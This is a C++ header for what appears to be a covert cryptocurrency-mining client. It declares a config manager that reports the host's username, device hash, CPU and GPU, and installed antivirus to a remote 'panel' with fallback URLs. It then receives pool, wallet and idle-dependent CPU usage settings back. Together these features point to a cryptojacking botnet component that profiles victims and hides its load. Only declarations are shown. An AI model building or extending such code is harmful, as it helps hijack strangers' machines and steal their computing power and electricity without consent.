#pragma once

#include <string>
#include <unordered_map>
#include "json.hpp"

using json = nlohmann::json;

struct MinerConfig {
    std::string mining_url;
    std::string wallet;
    std::string password;
    double non_idle_usage;
    double idle_usage;
    int wait_time_idle;
    int use_ssl;  // 0 = no SSL, 1 = SSL/TLS
};

class ConfigManager {
public:
    ConfigManager() = default;
    
    // Submit miner info to panel and get config back (single URL)
    bool FetchConfigFromPanel(const std::wstring& panelUrl, 
                             const std::string& pcUsername,
                             const std::string& deviceHash,
                             const std::string& cpuName,
                             const std::string& gpuName,
                             const std::string& antivirusName,
                             double cpuHashrate = 0.0,
                             double gpuHashrate = 0.0,
                             int deviceUptimeMin = 0);
    
    // Submit miner info with fallback URLs
    bool FetchConfigFromPanelWithFallback(const std::string& panelUrls,
                                          const std::string& pcUsername,
                                          const std::string& deviceHash,
                                          const std::string& cpuName,
                                          const std::string& gpuName,
                                          const std::string& antivirusName,
                                          double cpuHashrate = 0.0,
                                          double gpuHashrate = 0.0,
                                          int deviceUptimeMin = 0);
    
    // Get configuration
    const MinerConfig& GetCPUConfig() const { return cpuConfig; }
    const MinerConfig& GetGPUConfig() const { return gpuConfig; }
    
    // Build command line arguments from config
    std::string BuildCommandLineArgs(const MinerConfig& config, bool isIdle = false);
    
private:
    MinerConfig cpuConfig;
    MinerConfig gpuConfig;
    
    void ParseConfigFromJson(const json& jsonResponse);
};
